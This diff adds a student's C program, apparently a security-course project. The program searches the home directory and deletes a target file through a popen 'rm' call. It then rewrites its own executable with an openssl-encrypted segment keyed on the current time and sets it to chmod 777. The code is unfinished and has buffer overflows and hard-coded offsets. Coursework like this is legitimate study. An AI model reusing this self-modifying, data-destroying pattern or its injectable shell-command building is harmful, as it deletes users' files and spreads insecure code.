@@ -1,0 +1,153 @@
+Maghen Smith
+I discussed ftw() with Alyssa Kelly and the popen/ssl commands with Will Bates
+
+More Sources…
+http://www.tutorialspoint.com/cprogramming/c_file_io.htm
+http://stackoverflow.com/questions/16813850/read-exe-bin-file-file-convert-print
+http://stackoverflow.com/questions/7500892/get-index-of-substring
+http://www.linuxquestions.org/questions/programming-9/c-howto-read-binary-file-into-buffer-172985/
+http://www.madboa.com/geek/openssl/#encrypt-base64
+http://www.lainoox.com/how-to-execute-shell-commands-c/
+
+CODE:
+
+// Maghen Smith
+// This program first uses ftw to find the file to delete. Then it reads smithm_proj1.exe in binary until it finds the string "MODIFY ME-", takes the next 5 characters in, and encrypts them using openssl. I write the current time in hour min seconds to a text file and use that as the key, so the key will (most likely) change every time. It writes the binary to a new file (with the new encryption) and then writes over itself.
+// Sources:
+// voyager.deanza.edu/~perry/ftw.html
+// http://labs.hoffmanlabs.com/node/1277
+// http://www.cplusplus.com/reference/cstdio/sprintf/ 
+
+#include <stdio.h>
+#include <ftw.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <time.h>
+
+void dummy(){
+char *str = "MODIFY ME-hello";
+}
+
+
+int main(){
+
+//delete file
+char path[1000], *home;
+int myfunc(const char *, const struct stat *, int);
+home = getenv("HOME");
+sprintf(path, "%s", home);
+ftw(path, myfunc, 7);				//FIX LATER
+
+//start reading exe
+FILE *f;
+int i;
+if ((f = fopen("smithm_proj1.exe", "rb")) == NULL){
+        fprintf(stderr, "Can't open file for reading!\n");
+        return 1;
+    }
+   //get length of exe
+   if(fseek(f, 0, SEEK_END) != 0){}
+        long file_size = ftell(f);
+        //printf("\n%ld", file_size);
+
+   //create new file
+   FILE *new;
+   if((new = fopen("smithm_proj1_temp.exe", "wb")) ==NULL) {printf("ERROR");}
+
+   //find start string to encrypt
+   int m = fseek(f, 0,SEEK_SET);
+   unsigned char k[file_size]; //temp storage
+   fread(k, 5226, 1, f);     		//FOR NOW
+        for(i = 0; i < 5226; i++){      //FOR NOW 
+   }
+   fwrite(k, 1, 5226, new);
+
+   //put current time in smithm_time_file.txt to be used by openssl
+   FILE *time_file = fopen("smithm_time_file.txt", "w");
+   time_t epoch_time;
+   struct tm *tm_p;
+   epoch_time = time(NULL);
+   tm_p = localtime(&epoch_time);
+   char* my_time = (char*)malloc(6);
+   memset(my_time, 0, 6);
+   sprintf(my_time, "%.2d%.2d%.2d", tm_p->tm_hour, tm_p->tm_min, tm_p->tm_sec);
+   //printf("\nTIME: %s", my_time);  
+   fwrite(my_time,1 , 6, time_file);
+   fclose(time_file);
+
+   //encrypt
+   char *encrypt = (char*)malloc(6);
+   char *resp = (char*)malloc(100);
+   memset(encrypt, 0, 6);
+   memset(encrypt, 0, 6);
+   strcpy(resp, "echo \"");
+   strcpy(encrypt, "");
+   	m = fseek(f, 5226, SEEK_SET);     // PUT "hello!" HERE!
+        unsigned char hello[6]; //stuff to be encrypted
+        fread(hello, 6, 1, f);
+	for(i = 0; i < 5; i++){ //printf("\nTo be encrypted:%d", hello[i]);
+	encrypt[i] = hello[i];
+   }
+   printf("\nBefore: %s", encrypt);
+   strcat(resp, encrypt);
+   strcat(resp, "\" | openssl enc -aes-128-cbc -nosalt -kfile smithm_time_file.txt");
+   FILE* reader = popen(resp, "r");
+   char data[100];
+   fgets(data, 100, reader);
+   fclose(reader);
+   unsigned char encrypted[5];
+   char sign_encrypted[5];
+   sprintf(encrypted, "%s", data);
+     for(i = 6; i < 11; i++){
+	 //printf("\nEncrypted:%u", encrypted[i]);
+	sign_encrypted[i] = encrypted[i];
+	}
+   printf("\nAfter: ");
+   for(i = 0; i < 5; i++){printf("%c", (char)encrypted[i]);}
+   fwrite(encrypted, 1, 6, new);
+   //continue writing to k
+   fread(k, (file_size-5226 - 1), 1, f);//was4768
+   fwrite(k, 1, (file_size-5226 - 1), new);    
+
+
+    // write over current file          
+   FILE *delete_current;
+   delete_current = popen("mv ./smithm_proj1_temp.exe ./smithm_proj1.exe -f", "w");
+   fclose(delete_current);
+   FILE *chmod;
+   chmod = popen("chmod 777 smithm_proj1.exe", "w");
+   fclose(chmod);
+   FILE *del_time;
+   del_time = popen("rm smithm_time_file.txt", "w");
+   fclose(del_time);
+fclose(f);
+    return 0;
+}
+
+int myfunc(const char *path, const struct stat *sptr, int type){
+	FILE *pf;
+	char *keep = (char *)malloc(1000), *command = (char *)malloc(1000);
+	char *temp = (char *)malloc(1000);
+
+	memset(keep, 0, 1000);
+	memset(command, 0, 1000);
+	memset(temp, 0, 1000);
+	if ((type == FTW_F) && strstr(path, "class/comp6370/proj1_search/comp6370_proj1.txt")){
+        printf("Name = %s\n", path);    
+        keep = path;
+        
+        strcpy(command, "rm ");                 
+        strcpy(temp, path);
+                strcat(command, temp);
+        pf = popen(command, "w");
+	printf("File Deletion Successful -- Maghen");
+	return 1;
+	}
+	else{ 	
+return 0;}
+}
+
+
+
